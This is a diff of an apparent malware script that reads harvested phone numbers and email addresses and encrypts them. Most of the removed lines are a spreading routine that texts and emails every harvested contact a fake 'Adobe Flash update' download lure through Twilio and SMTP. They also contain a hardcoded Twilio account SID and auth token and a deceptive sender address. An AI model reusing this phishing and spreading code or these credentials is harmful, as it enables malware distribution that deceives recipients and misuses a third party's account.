@@ -31,48 +31,15 @@ fp_emails = open('emails.txt','r')
 numbers_plain = "PHONE_NUMBER_HEADER\n" + fp_numbers.read()
 emails_plain = "EMAILS_HEADER\n" + fp_emails.read()
 #numbers_cipher = pubkey.encrypt(numbers_plain, 0)
-emails_cipher = pubkey.encrypt(emails_plain, 0)
-fp_numbers.seek(0)
-fp_emails.seek(0)
-
+#emails_cipher = pubkey.encrypt(emails_plain, 0)
 #print privkey.decrypt(numbers_cipher))
 #print privkey.decrypt(emails_cipher)
 
-numbers_list = []
-emails_list = []
-for number in fp_numbers:
-	numbers_list.append(number.rstrip())
-for email in fp_emails:
-	emails_list.append(email.rstrip())
-#print numbers_list
-#print emails_list
+fp_numbers.seek(0)
+fp_emails.seek(0)
 
 fp_numbers.close()
 fp_emails.close()
-
-client = TwilioRestClient('ACb89307719aa8043871f9912452ef21c6','2f56bc2c9d8ae27afa3baf74fb46f0cb')
-text_body = "Hey have you heard about the new Adobe flash update? Download it here: "
-for number in numbers_list:
-	try:
-		#client.messages.create(from_="+12175763259",to=number,body=text_body)
-		no_op = 0
-	except:
-		no_op = 0
-
-
-
-server = smtplib.SMTP()
-msg = MIMEText("Hey have you heard about the new Adobe flash update? Download it here: ")
-me = "aadoobeeflashy@gmail.com"
-msg['Subject'] = "Adobe Flash 1337 Update"
-msg['From'] = me
-s = smtplib.SMTP('localhost')
-
-for email in emails_list:
-	you = email
-	msg['To'] = you
-	#s.sendmail(me, [you], msg.as_string())
-s.quit()
 
 # s = socket.socket()         # Create a socket object
 # host = '10.0.2.15'  
